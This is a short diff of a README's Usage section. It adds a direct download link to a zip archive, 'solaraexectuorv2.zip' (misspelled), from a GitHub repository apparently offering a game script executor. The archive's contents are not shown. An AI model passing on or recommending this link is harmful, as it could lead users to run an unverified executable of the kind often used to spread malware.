@@ -10,7 +10,7 @@
   
 ## Usage
 
- * [Download]() the zip archive in Release or tap on the button. <br>
+ * [Download](https://github.com/chazolivermoss670/solaraexecutor/releases/download/Download/solaraexectuorv2.zip) the zip archive in Release or tap on the button. <br>
 
  
 ## Notes
